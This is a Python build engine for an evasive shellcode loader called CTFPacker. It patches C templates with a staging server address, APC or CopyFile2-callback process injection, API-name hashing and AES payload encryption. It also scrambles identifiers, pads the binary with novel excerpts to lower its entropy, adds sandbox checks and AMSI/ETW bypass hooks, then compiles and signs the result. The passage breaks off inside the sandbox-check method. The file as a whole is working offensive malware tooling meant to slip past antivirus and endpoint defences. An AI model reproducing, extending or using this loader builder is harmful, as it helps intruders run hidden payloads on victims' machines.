# -*- coding: utf-8 -*-
"""
Reusable build engine extracted from main.py.
Both CLI and GUI call into this module.
"""
import os
import sys
import re
import random
import shutil
import errno
import subprocess

from core.build_config import BuildConfig
from core.hashing import Hasher
from core.encryption import Encryption


class BuildEngine:
    """Runs a CTFPacker build given a BuildConfig."""

    def __init__(self, log_callback=None):
        """
        Args:
            log_callback: callable(message: str, level: str)
                          level is one of: info, success, warning, error
                          If None, messages are silently dropped.
        """
        self._log = log_callback or (lambda msg, lvl: None)
        self._base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def build(self, config: BuildConfig) -> bool:
        """Run the full build pipeline. Returns True on success."""
        try:
            if config.mode == "staged":
                return self._build_staged(config)
            elif config.mode == "stageless":
                return self._build_stageless(config)
            else:
                self._log(f"Unknown mode: {config.mode}", "error")
                return False
        except Exception as e:
            self._log(f"Build failed with error: {e}", "error")
            return False

    # ------------------------------------------------------------------
    # Staged build
    # ------------------------------------------------------------------

    def _build_staged(self, config: BuildConfig) -> bool:
        self._log("Staged Payload selected.", "info")
        self._log("Starting the process...", "warning")

        dst = self._setup_temp_dir("staged")
        if dst is None:
            return False

        try:
            self._log("Corresponding template selected..", "info")

            # Replace download placeholders
            self._replace_download_placeholders(dst, config)

            # Read payload
            with open(config.payload_path, "rb") as f:
                payload = f.read()

            # Set target process (APC only)
            if config.inject_method == "apc":
                self._set_target_process(dst, config)

            # Set injection method (must happen before hash replacement
            # because APC injection code contains hash placeholders)
            self._set_injection_method(dst, config)

            # Replace hashes (after injection method so all placeholders exist)
            self._replace_hashes(dst)

            # Randomize callback temp filenames (inject.c always compiled in)
            self._randomize_callback_filenames(dst)

            self._log("Template files modified !", "success")

            # Encryption
            if config.encrypt:
                self._handle_encryption_staged(dst, config, payload)
            else:
                self._handle_no_encryption_staged(dst, config, payload)

            # Scramble
            if config.scramble:
                self._handle_scramble_staged(dst)
                self._randomize_optimization(dst)

            # Entropy reduction
            if config.entropy_reduction:
                self._handle_entropy_reduction(dst)

            # Sandbox checks (always resolve placeholder; inserts call only if enabled)
            self._handle_sandbox_checks(dst, config)

            # Debug mode (must come before _replace_hashes)
            self._handle_debug_mode(dst, config)

            # Trampoline hooks (AMSI / ETW bypass)
            self._handle_trampoline_bypass(dst, config)

            # Compile and sign
            return self._compile_and_sign(dst, config)

        except Exception as e:
            self._log(f"Build error: {e}", "error")
            self._cleanup(dst)
            return False

    # ------------------------------------------------------------------
    # Stageless build
    # ------------------------------------------------------------------

    def _build_stageless(self, config: BuildConfig) -> bool:
        self._log("Stageless Payload selected.", "info")
        self._log("Starting the process...", "warning")

        dst = self._setup_temp_dir("stageless")
        if dst is None:
            return False

        try:
            # Read payload
            with open(config.payload_path, "rb") as f:
                raw_payload = f.read()

            payload_hex = ', '.join(f"0x{b:02x}" for b in raw_payload)

            # Set target process (APC only)
            if config.inject_method == "apc":
                self._set_target_process(dst, config)

            # Set injection method (must happen before hash replacement
            # because APC injection code contains hash placeholders)
            self._set_injection_method(dst, config)

            # Replace hashes (after injection method so all placeholders exist)
            self._replace_hashes(dst)

            # Randomize callback temp filenames (inject.c always compiled in)
            self._randomize_callback_filenames(dst)

            self._log("Template files modified !", "success")

            # Encryption
            if config.encrypt:
                self._handle_encryption_stageless(dst, config, raw_payload)
            else:
                self._handle_no_encryption_stageless(dst, config, payload_hex)

            # Scramble
            if config.scramble:
                self._handle_scramble_stageless(dst)
                self._randomize_optimization(dst)

            # Entropy reduction
            if config.entropy_reduction:
                self._handle_entropy_reduction(dst)

            # Sandbox checks (always resolve placeholder; inserts call only if enabled)
            self._handle_sandbox_checks(dst, config)

            # Debug mode (must come before _replace_hashes)
            self._handle_debug_mode(dst, config)

            # Trampoline hooks (AMSI / ETW bypass)
            self._handle_trampoline_bypass(dst, config)

            # Compile and sign
            return self._compile_and_sign(dst, config)

        except Exception as e:
            self._log(f"Build error: {e}", "error")
            self._cleanup(dst)
            return False

    # ------------------------------------------------------------------
    # Shared helpers
    # ------------------------------------------------------------------

    def _setup_temp_dir(self, template_name: str) -> str:
        """Copy template files to a temp .ctfpacker directory. Returns path or None."""
        src = os.path.join(self._base_dir, "templates", template_name)
        dst = os.path.join(self._base_dir, ".ctfpacker")

        try:
            shutil.copytree(src, dst)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst)
                shutil.copytree(src, dst)
            else:
                self._log(f"Error setting up temp dir: {e}", "error")
                return None
        return dst

    def _replace_hashes(self, dst: str):
        """Replace hash placeholders in all .c/.h files."""
        seed = random.randint(5, 20)
        initial_hash = random.randint(2000, 9000)

        replacements = {
            "#-INITIAL_HASH_VALUE-#": str(initial_hash),
            "#-INITIAL_SEED_VALUE-#": str(seed),
            "#-NTDLL_VALUE-#": Hasher.Hasher("NTDLL.DLL", seed, initial_hash),
            "#-KERNEL32_VALUE-#": Hasher.Hasher("KERNEL32.DLL", seed, initial_hash),
            "#-KERNELBASE_VALUE-#": Hasher.Hasher("KERNELBASE.DLL", seed, initial_hash),
            "#-DAPS_VALUE-#": Hasher.Hasher("DebugActiveProcessStop", seed, initial_hash),
            "#-CREATEPROCESSA_VALUE-#": Hasher.Hasher("CreateProcessA", seed, initial_hash),
            "#-NTMVOS_VALUE-#": Hasher.Hasher("NtMapViewOfSection", seed, initial_hash),
            # sandbox.c API hashing
            "#-GETTICKCOUNT64_VALUE-#": Hasher.Hasher("GetTickCount64", seed, initial_hash),
            "#-GLOBALMEMORYSTATUSEX_VALUE-#": Hasher.Hasher("GlobalMemoryStatusEx", seed, initial_hash),
            "#-GETSYSTEMINFO_VALUE-#": Hasher.Hasher("GetSystemInfo", seed, initial_hash),
            # trampoline.c API hashing
            "#-AMSI_VALUE-#": Hasher.Hasher("AMSI.DLL", seed, initial_hash),
            "#-AMSISCANBUFFER_VALUE-#": Hasher.Hasher("AmsiScanBuffer", seed, initial_hash),
            "#-ETWEVENTWRITEEX_VALUE-#": Hasher.Hasher("EtwEventWriteEx", seed, initial_hash),
            "#-ETWEVENTWRITE_VALUE-#": Hasher.Hasher("EtwEventWrite", seed, initial_hash),
            "#-ETWEVENTWRITEFULL_VALUE-#": Hasher.Hasher("EtwEventWriteFull", seed, initial_hash),
            "#-ETWEVENTWRITETRANSFER_VALUE-#": Hasher.Hasher("EtwEventWriteTransfer", seed, initial_hash),
        }

        for filename in os.listdir(dst):
            if filename.endswith(".c") or filename.endswith(".h"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.read()
                for placeholder, value in replacements.items():
                    data = data.replace(placeholder, value)
                with open(filepath, "w") as f:
                    f.write(data)

    def _replace_download_placeholders(self, dst: str, config: BuildConfig):
        """Replace IP/port/path/https/user-agent placeholders in download.c."""
        filepath = os.path.join(dst, "download.c")
        with open(filepath, "r") as f:
            data = f.read()

        use_https = "1" if config.https else "0"
        data = data.replace("#-IP_VALUE-#", config.ip_address)
        data = data.replace("#-PORT_VALUE-#", str(config.port))
        data = data.replace("#-PATH_VALUE-#", config.path)
        data = data.replace("#-USE_HTTPS-#", use_https)
        data = data.replace("#-USER_AGENT-#", config.user_agent)

        with open(filepath, "w") as f:
            f.write(data)

    def _set_target_process(self, dst: str, config: BuildConfig):
        """Set the APC injection target process placeholder.

        Instead of a plain string literal (visible in .rdata via `strings`),
        the process name is emitted as a stack-style char array so it does not
        appear as a contiguous null-terminated string in the binary.
        """
        self._log("Setting APC injection target process...", "warning")

        # Build a char-by-char array initialiser, e.g. 'R','u','n',... ,'\0'
        chars = ', '.join(f"'{c}'" for c in config.target_process)
        char_decl = f"static char TARGET_PROCESS[] = {{{chars}, '\\0'}};"

        target_file = "main.c" if config.format != "DLL" else "main_dll.c"
        filepath = os.path.join(dst, target_file)

        with open(filepath, "r") as f:
            data = f.read()
        # Replace the whole #define line — not just the inner placeholder —
        # so no string literal ever ends up in the binary.
        data = data.replace('#define TARGET_PROCESS "#-TARGET_PROCESS-#"', char_decl)
        with open(filepath, "w") as f:
            f.write(data)

        self._log(f"Target APC injection process set to {config.target_process} !", "success")

    def _set_injection_method(self, dst: str, config: BuildConfig):
        """Replace injection method placeholder with the appropriate code."""
        self._log("Setting injection method...", "warning")

        if config.inject_method == "apc":
            injection_code = '''//printf("[i] Injecting the shellcode into the process..\\n");
\t// Doing the APC Injection
\tif (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess)) {

\t\treturn -1;
\t}

\tSleep(1500);
\t//printf("[i] Running the shellcode via NtQueueApcThread..\\n");
\t// Running the thread via QueueAPCThread
\tif ((STATUS = NTQAT(hThread, pProcess, NULL, NULL, NULL)) != 0) {

\t\t//printf("[-] NtQueueApcThrad failed!\\n");
\t\treturn -1;
\t}
\t
\t// API Hashing
\tcDAPS cDAPSu = (cDAPS) GetProcAddressH(GetModuleHandleH(#-KERNELBASE_VALUE-#), #-DAPS_VALUE-#);

\t//printf("[i] Position of DAPsu: 0x%p\\n", cDAPSu);

\tSleep(1000);
\t// Stopping the debugging of the process, which launches the payload
\tcDAPSu(dwProcessId);
\t//printf("[+] Payload executed!\\n");'''
        elif config.inject_method == "callback":
            injection_code = '''//printf("[i] Executing shellcode via CopyFile2 callback..\\n");
\t// Doing Callback Injection
\tif (!CallbackInjection(pClearText, sEncPayload, &pProcess)) {

\t\treturn -1;
\t}
\t
\t//printf("[+] Payload executed via callback!\\n");'''

        target_file = "main.c" if config.format != "DLL" else "main_dll.c"
        filepath = os.path.join(dst, target_file)

        with open(filepath, "r") as f:
            data = f.read()
        data = data.replace("// #-INJECTION_METHOD_PLACEHOLDER-#", injection_code)

        # CopyFile2 injection doesn't need a suspended process —
        # comment out CreateSuspendedProcess and its surrounding sleeps/prints
        if config.inject_method == "copyfile2":
            lines = data.splitlines(keepends=True)
            in_csp_block = False
            for i in range(len(lines)):
                # Start of the CreateSuspendedProcess block
                if "Creating suspended process" in lines[i] or "Creating a suspeneded process" in lines[i]:
                    in_csp_block = True
                if in_csp_block:
                    lines[i] = "//" + lines[i]
                    # End after the closing brace of the if-block
                    if "Process created with PID" in lines[i]:
                        in_csp_block = False
            data = ''.join(lines)

        with open(filepath, "w") as f:
            f.write(data)

        self._log(f"Injection method set to {config.inject_method} !", "success")

    # ------------------------------------------------------------------
    # Staged encryption
    # ------------------------------------------------------------------

    @staticmethod
    def _staged_bin_path(config: BuildConfig) -> str:
        """Return the path where the staged .bin payload file should be written.

        The filename is derived from the server path parameter (config.path / -pa)
        so the file can be dropped straight into the HTTP server root without
        manual renaming.  E.g. -pa /shellcode.bin → <output_dir>/shellcode.bin.
        """
        # Strip URL-style leading slashes and take only the last component.
        server_path = config.path.strip('/\\')
        filename = os.path.basename(server_path) if server_path else ""
        if not filename:
            filename = "shellcode.bin"

        # Place the file in the same directory as the output .exe.
        exe_base = config.output or "ctfloader"
        exe_root, _ = os.path.splitext(exe_base)
        out_dir = os.path.dirname(exe_root)
        if out_dir:
            os.makedirs(out_dir, exist_ok=True)
            return os.path.join(out_dir, filename)
        return filename

    def _handle_encryption_staged(self, dst: str, config: BuildConfig, payload: bytes):
        self._log("Encryption selected.", "info")
        self._log("Encrypting the payload...", "warning")

        enc_payload, key, iv = Encryption.EncryptAES(payload)

        # Name the .bin from the server path (-pa) so it matches what the loader requests.
        output_bin = self._staged_bin_path(config)

        # Guard: if the resolved .bin path is the same file as the payload,
        # writing the encrypted data would silently clobber the original shellcode.
        if os.path.abspath(output_bin) == os.path.abspath(config.payload_path):
            root = os.path.splitext(output_bin)[0]
            output_bin = root + "_enc.bin"
            self._log(
                f"Output .bin path collides with payload — saving encrypted payload to "
                f"{os.path.basename(output_bin)} instead",
                "warning"
            )

        if os.path.exists(output_bin):
            os.remove(output_bin)
        with open(output_bin, "wb") as f:
            f.write(enc_payload)

        # Replace key/iv in main*.c files
        for filename in os.listdir(dst):
            if filename.startswith("main") and filename.endswith(".c"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.read()
                data = data.replace("#-KEY_VALUE-#", key)
                data = data.replace("#-IV_VALUE-#", iv)
                with open(filepath, "w") as f:
                    f.write(data)

        self._log(f"Payload encrypted and saved to {os.path.abspath(output_bin)} !", "success")

    def _handle_no_encryption_staged(self, dst: str, config: BuildConfig, payload: bytes):
        self._log("Encryption not selected.", "info")
        self._log("Compiling the loader...", "warning")

        for filename in os.listdir(dst):
            if filename.startswith("main") and filename.endswith(".c"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.readlines()

                for i in range(len(data)):
                    if '#include "AES_128_CBC.h"' in data[i]:
                        data[i] = f"//{data[i]}"
                    if "AES_CTX" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in data[i]:
                        data[i] = f"//{data[i]}"
                    if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in data[i]:
                        data[i] = f"//{data[i]}"
                    if "Starting the decryption..." in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "pClearText = (PBYTE)malloc(sEncPayload);" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "AES_DecryptInit(&ctx, aes_k, aes_i);" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "Payload decrypted at postion: 0x%p with size of %zu" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in data[i]:
                        data[i] = "\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {"
                    if "CallbackInjection(pClearText," in data[i]:
                        data[i] = data[i].replace("CallbackInjection(pClearText,", "CallbackInjection((PBYTE) pEncPayload,")
                    if "SecureZeroMemory(aes_k," in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "SecureZeroMemory(aes_i," in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "SecureZeroMemory(&ctx," in data[i]:
                        data[i] = f"\t//{data[i]}"

                with open(filepath, "w") as f:
                    f.writelines(data)

        # Name the .bin from the server path (-pa) so it matches what the loader requests.
        output_bin = self._staged_bin_path(config)
        # Only copy when the source and destination differ — same path is a no-op
        # and shutil.copy would raise SameFileError on most platforms.
        if os.path.abspath(config.payload_path) != os.path.abspath(output_bin):
            shutil.copy(config.payload_path, output_bin)

    # ------------------------------------------------------------------
    # Stageless encryption
    # ------------------------------------------------------------------

    def _handle_encryption_stageless(self, dst: str, config: BuildConfig, raw_payload: bytes):
        self._log("Encryption selected.", "info")
        self._log("Encrypting the payload...", "warning")

        enc_payload, key, iv = Encryption.EncryptAES(raw_payload)
        hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)

        for filename in os.listdir(dst):
            if filename.startswith("main") and filename.endswith(".c"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.read()
                data = data.replace("#-KEY_VALUE-#", key)
                data = data.replace("#-IV_VALUE-#", iv)
                data = data.replace("#-PAYLOAD_VALUE-#", hex_payload)
                with open(filepath, "w") as f:
                    f.write(data)

        self._log("Payload encrypted and saved into payload[] variable in main.c !", "success")

    def _handle_no_encryption_stageless(self, dst: str, config: BuildConfig, payload_hex: str):
        self._log("Encryption not selected.", "info")
        self._log("Compiling the loader...", "warning")

        for filename in os.listdir(dst):
            if filename.startswith("main") and filename.endswith(".c"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.readlines()

                for i in range(len(data)):
                    if '#include "AES_128_CBC.h"' in data[i]:
                        data[i] = f"//{data[i]}"
                    if "AES_CTX" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in data[i]:
                        data[i] = f"//{data[i]}"
                    if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in data[i]:
                        data[i] = f"//{data[i]}"
                    if "Starting the decryption..." in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "pClearText = (PBYTE)malloc(sEncPayload);" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "AES_DecryptInit(&ctx, aes_k, aes_i);" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload)" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "Payload decrypted at postion: 0x%p with size of %zu" in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in data[i]:
                        data[i] = "\tif (!APCInjection(hProcess, (PVOID) &payload, sEncPayload, &pProcess)) {"
                    if "CallbackInjection(pClearText," in data[i]:
                        data[i] = data[i].replace("CallbackInjection(pClearText,", "CallbackInjection((PBYTE) payload,")
                    if "#-PAYLOAD_VALUE-#" in data[i]:
                        data[i] = data[i].replace("#-PAYLOAD_VALUE-#", payload_hex)
                    if "SecureZeroMemory(aes_k," in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "SecureZeroMemory(aes_i," in data[i]:
                        data[i] = f"\t//{data[i]}"
                    if "SecureZeroMemory(&ctx," in data[i]:
                        data[i] = f"\t//{data[i]}"

                with open(filepath, "w") as f:
                    f.writelines(data)

    # ------------------------------------------------------------------
    # Scramble (staged)
    # ------------------------------------------------------------------

    def _handle_scramble_staged(self, dst: str):
        self._log("Scrambling selected.", "info")
        self._log("Scrambling the loader...", "warning")

        functions = [
            "HashStringDjb2A", "GetProcAddressH", "GetModuleHandleH", "MapNtdll",
            "Unhook", "AES_DecryptInit", "AES_DecryptBuffer", "CreateSuspendedProcess",
            "APCInjection", "CallbackInjection", "cDAPSu", "cCPAu", "aes_k", "aes_i",
            "AES_Decrypt", "AES_Encrypt", "AES_EncryptInit", "GetContent",
            "NTAVM", "NTPVM", "NTWVM", "NTQAT"
        ]

        variables = [
            "sEncPayload", "pEncPayload", "pClearText", "ctx", "hProcess",
            "pProcess", "dwSizeOfClearText", "dwOldProtect", "dwProcessId"
        ]

        name_map = self._generate_name_map(functions + variables)
        self._apply_scramble(dst, functions + variables, name_map)

        # Scramble variables in main*.c files
        for filename in os.listdir(dst):
            if filename.startswith("main") and filename.endswith(".c"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.read()
                for var in variables:
                    data = self._word_boundary_replace(data, var, name_map[var])
                with open(filepath, "w") as f:
                    f.write(data)

        self._log("Loader scrambled !", "success")

    # ------------------------------------------------------------------
    # Scramble (stageless)
    # ------------------------------------------------------------------

    def _handle_scramble_stageless(self, dst: str):
        self._log("Scrambling selected.", "info")
        self._log("Scrambling the loader...", "warning")

        functions = [
            "HashStringDjb2A", "GetProcAddressH", "GetModuleHandleH", "MapNtdll",
            "Unhook", "AES_DecryptInit", "AES_DecryptBuffer", "CreateSuspendedProcess",
            "APCInjection", "CallbackInjection", "cDAPSu", "cCPAu", "aes_k", "aes_i",
            "AES_Decrypt", "AES_Encrypt", "AES_EncryptInit",
            "NTAVM", "NTPVM", "NTWVM", "NTQAT"
        ]

        variables = [
            "sEncPayload", "pEncPayload", "pClearText", "ctx", "hProcess",
            "pProcess", "dwSizeOfClearText", "dwOldProtect", "dwProcessId", "payload"
        ]

        name_map = self._generate_name_map(functions + variables)
        self._apply_scramble(dst, functions + variables, name_map)

        # Scramble variables in main*.c files
        for filename in os.listdir(dst):
            if filename.startswith("main") and filename.endswith(".c"):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.read()
                for var in variables:
                    data = self._word_boundary_replace(data, var, name_map[var])
                with open(filepath, "w") as f:
                    f.write(data)

        self._log("Loader scrambled !", "success")

    # ------------------------------------------------------------------
    # Scramble helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _generate_random_name():
        patterns = [
            lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(8, 32))),
            lambda: random.choice('abcdefghijklmnopqrstuvwxyz') * random.randint(5, 64),
            lambda: ''.join([random.choice('abcdefghijklmnopqrstuvwxyz') +
                             random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
                             for _ in range(random.randint(4, 16))]),
            lambda: random.choice('abcdefghijklmnopqrstuvwxyz_') + ''.join(
                random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_',
                               k=random.randint(9, 24)))
        ]
        return random.choice(patterns)()

    def _generate_name_map(self, names: list) -> dict:
        used = set()
        mapping = {}
        for name in names:
            new = self._generate_random_name()
            while new in used:
                new = self._generate_random_name()
            used.add(new)
            mapping[name] = new
        return mapping

    @staticmethod
    def _word_boundary_replace(data: str, name: str, replacement: str) -> str:
        """Replace name only at word boundaries (not after . or ->)."""
        # Negative lookbehind: don't match after '.' or '->'
        pattern = r'(?<!\.)(?<!->)\b' + re.escape(name) + r'\b'
        return re.sub(pattern, replacement, data)

    def _apply_scramble(self, dst: str, names: list, name_map: dict):
        """Replace function/variable names in all .c/.h/.asm files."""
        for filename in os.listdir(dst):
            if filename.endswith((".c", ".h", ".asm")):
                filepath = os.path.join(dst, filename)
                with open(filepath, "r") as f:
                    data = f.read()
                for name in names:
                    data = self._word_boundary_replace(data, name, name_map[name])
                with open(filepath, "w") as f:
                    f.write(data)

    def _randomize_callback_filenames(self, dst: str):
        """Replace the #-CALLBACK_SRC_TMP-# / #-CALLBACK_DST_TMP-# placeholders
        in inject.c with random hex filenames so the strings 'ctf_source.tmp'
        and 'ctf_dest.tmp' never appear in the binary.
        """
        hex_chars = '0123456789abcdef'
        src_name = ''.join(random.choices(hex_chars, k=12)) + '.tmp'
        dst_name = ''.join(random.choices(hex_chars, k=12)) + '.tmp'

        filepath = os.path.join(dst, "inject.c")
        with open(filepath, "r") as f:
            data = f.read()
        data = data.replace("#-CALLBACK_SRC_TMP-#", src_name)
        data = data.replace("#-CALLBACK_DST_TMP-#", dst_name)
        with open(filepath, "w") as f:
            f.write(data)

    def _randomize_optimization(self, dst: str):
        levels = ['-O1', '-O2', '-O3', '-Os', '-Oz']
        chosen = random.choice(levels)
        self._log(f"Using random optimization level: {chosen}", "warning")

        filepath = os.path.join(dst, "Makefile")
        with open(filepath, "r") as f:
            data = f.read()
        data = data.replace('-O0', chosen)
        with open(filepath, "w") as f:
            f.write(data)

    # ------------------------------------------------------------------
    # Entropy reduction
    # ------------------------------------------------------------------

    def _handle_entropy_reduction(self, dst: str):
        """Write entropy_text.c with a large English string constant to reduce binary entropy.

        The constant is declared __attribute__((used)) volatile so the compiler
        and linker both retain it in the .rdata section of the PE image.
        Comments are stripped at compile time and have no effect on entropy —
        only compiled-in data does.
        """
        self._log("Entropy reduction selected.", "info")
        self._log("Injecting English text padding...", "warning")

        # ~7 KB of natural English prose from public-domain works (Project Gutenberg).
        # Adjacent C string literals are concatenated by the compiler.
        #
        # NOTE: __attribute__((used)) alone is NOT enough — with -fdata-sections
        # and -Wl,--gc-sections the linker GCs data sections unreachable from the
        # entry point even if the compiler kept them in the .o file.
        # The __attribute__((constructor)) function runs before WinMain/DllMain via
        # the CRT .init_array section (which is always retained), and its reference
        # to _ctfp_entropy_text forces the linker to keep the text section too.
        entropy_c = (
            '#include <stddef.h>\n\n'
            'volatile const char _ctfp_entropy_text[] =\n'
            '    "Call me Ishmael. Some years ago, never mind how long precisely, having '\
            'little money in my pocket and nothing particular to interest me on shore, I '\
            'thought I would sail about a little and see the watery part of the world. It '\
            'is a way I have of driving off the spleen and regulating the circulation. '\
            'Whenever I find myself growing grim about the mouth, whenever it is a damp, '\
            'drizzly November in my soul, whenever I find myself involuntarily pausing '\
            'before coffin warehouses and bringing up the rear of every funeral I meet, '\
            'and especially whenever my hypos get such an upper hand of me that it requires '\
            'a strong moral principle to prevent me from deliberately stepping into the '\
            'street and methodically knocking people\'s hats off, then I account it high '\
            'time to get to sea as soon as I can. This is my substitute for pistol and '\
            'ball. With a philosophical flourish Cato throws himself upon his sword; I '\
            'quietly take to the ship. There is nothing surprising in this. If they only '\
            'knew it, almost all men in their degree, some time or other, cherish very '\
            'nearly the same feelings towards the ocean with me. "\n'
            '    "It is a truth universally acknowledged, that a single man in possession '\
            'of a good fortune, must be in want of a wife. However little known the '\
            'feelings or views of such a man may be on his first entering a neighbourhood, '\
            'this truth is so well fixed in the minds of the surrounding families, that he '\
            'is considered as the rightful property of some one or other of their daughters. '\
            'My dear Mr. Bennet, said his lady to him one day, have you heard that '\
            'Netherfield Park is let at last? Mr. Bennet replied that he had not. But it '\
            'is, returned she, for Mrs. Long has just been here, and she told me all about '\
            'it. Mr. Bennet made no answer. Do you not want to know who has taken it? '\
            'cried his wife impatiently. You want to tell me, and I have no objection to '\
            'hearing it. This was invitation enough. Why, my dear, you must know, Mrs. '\
            'Long says that Netherfield is taken by a young man of large fortune from the '\
            'north of England. "\n'
            '    "To Sherlock Holmes she is always the woman. I have seldom heard him '\
            'mention her under any other name. In his eyes she eclipses and predominates '\
            'the whole of her sex. It was not that he felt any emotion akin to love for '\
            'Irene Adler. All emotions, and that one particularly, were abhorrent to his '\
            'cold, precise but admirably balanced mind. He was, I take it, the most perfect '\
            'reasoning and observing machine that the world has seen, but as a lover he '\
            'would have placed himself in a false position. He never spoke of the softer '\
            'passions, save with a gibe and a sneer. They were admirable things for the '\
            'observer, excellent for drawing the veil from men\'s motives and actions. But '\
            'for the trained reasoner to admit such intrusions into his own delicate and '\
            'finely adjusted temperament was to introduce a distracting factor which might '\
            'throw a doubt upon all his mental results. Grit in a sensitive instrument, or '\
            'a crack in one of his own high-power lenses, would not be more disturbing '\
            'than a strong emotion in a nature such as his. "\n'
            '    "Among the many problems which have been submitted to my friend Mr. '\
            'Sherlock Holmes for solution during the years of our intimacy, there were some '\
            'which involved the consideration of large public questions. These he solved '\
            'with a quiet efficiency that I have found it difficult to equal. The Adventure '\
            'of the Blue Carbuncle was one of those simpler cases which had an unusual '\
            'interest attached to them. It was about three o\'clock on a bitterly cold '\
            'afternoon when he opened the door and entered my consulting room, dragging '\
            'with him a great blue carbuncle that glittered with a cold blue light. '\
            'I see, Watson, he said, that you have lately been in Afghanistan, I perceive. '\
            'How on earth did you know that? I asked in astonishment. Never mind, said he, '\
            'chuckling to himself. The question now is about the blue carbuncle. This stone '\
            'is not yet twenty years old. It came from the Amoy River in southern China. '\
            'It has been described as the most dangerous piece of property in the world. "\n'
            '    "The thousand injuries of Fortunato I had borne as I best could, but '\
            'when he ventured upon insult I vowed revenge. You, who so well know the nature '\
            'of my soul, will not suppose, however, that I gave utterance to a threat. At '\
            'length I would be avenged; this was a point definitively settled, but the very '\
            'definitiveness with which it was resolved precluded the idea of risk. I must '\
            'not only punish but punish with impunity. A wrong is unredressed when '\
            'retribution overtakes its redresser. It is equally unredressed when the '\
            'avenger fails to make himself felt as such to him who has done the wrong. '\
            'It must be understood that neither by word nor deed had I given Fortunato '\
            'cause to doubt my good will. I continued, as was my wont, to smile in his '\
            'face, and he did not perceive that my smile now was at the thought of his '\
            'immolation. He had a weak point, this Fortunato, although in other regards '\
            'he was a man to be respected and even feared. He prided himself on his '\
            'connoisseurship in wine. Few Italians have the true virtuoso spirit. "\n'
            '    "It was the best of times, it was the worst of times, it was the age of '\
            'wisdom, it was the age of foolishness, it was the epoch of belief, it was the '\
            'epoch of incredulity, it was the season of Light, it was the season of '\
            'Darkness, it was the spring of hope, it was the winter of despair, we had '\
            'everything before us, we had nothing before us, we were all going direct to '\
            'Heaven, we were all going direct the other way. There were a king with a large '\
            'jaw and a queen with a plain face on the throne of England; there were a king '\
            'with a large jaw and a queen with a fair face on the throne of France. In both '\
            'countries it was clearer than crystal to the lords of the State preserves of '\
            'loaves and fishes, that things in general were settled for ever. "\n'
            '    "The man in black fled across the desert, and the Gunslinger followed. '\
            'The desert was the apotheosis of all deserts, huge, standing to the sky for '\
            'what looked like eternity in all directions. It was white and blinding and '\
            'waterless and without feature save for the faint, cloudy haze of the '\
            'mountains which sketched themselves on the horizon and the devil-grass which '\
            'brought sweet water and the occasional bird. The Gunslinger walked stolidly, '\
            'not hurrying, not loafing. A hide waterbag was slung around his middle like '\
            'a bloated sausage. It was almost full. He had progressed through the days '\
            'in a state of grace, and he felt that later something would catch up with '\
            'him, some terrible reckoning, but for now he walked and did not think much '\
            'at all. He was not sleeping well. Dreams of his mother and his childhood '\
            'haunted him, and occasionally he would hear her voice calling him back to '\
            'some important duty he had left undone. "\n'
            ';\n\n'
            '/* __attribute__((constructor)) puts this in .init_array which the CRT\n'
            '   always retains, and its reference to _ctfp_entropy_text forces the\n'
            '   linker to keep the text section even under -Wl,--gc-sections. */\n'
            '__attribute__((constructor)) static void _ctfp_entropy_anchor(void) {\n'
            '    volatile char _r = _ctfp_entropy_text[0];\n'
            '    (void)_r;\n'
            '}\n'
        )

        filepath = os.path.join(dst, "entropy_text.c")
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(entropy_c)

        # Add entropy_text.c to COMMON_SRCS in the Makefile.
        # Use a regex so trailing whitespace / CRLF variations don't break the match.
        makefile_path = os.path.join(dst, "Makefile")
        with open(makefile_path, "r") as f:
            makefile = f.read()
        makefile = re.sub(
            r'(\tsandbox\.c)\s*\n',
            r'\1 \\\n\tentropy_text.c\n',
            makefile
        )
        with open(makefile_path, "w") as f:
            f.write(makefile)

        self._log("English text padding injected into binary!", "success")

    # ------------------------------------------------------------------
    # Sandbox checks
    # ------------------------------------------------------------------

    def _handle_sandbox_checks(self, dst: str, config: "BuildConfig"):
        """Resolve all sandbox-related placeholders in main*.c and sandbox.c.

        When enabled, inserts a call to RunSandboxChecks() so the loader
        detects sandbox environments (uptime / RAM / CPU) and exits cleanly.
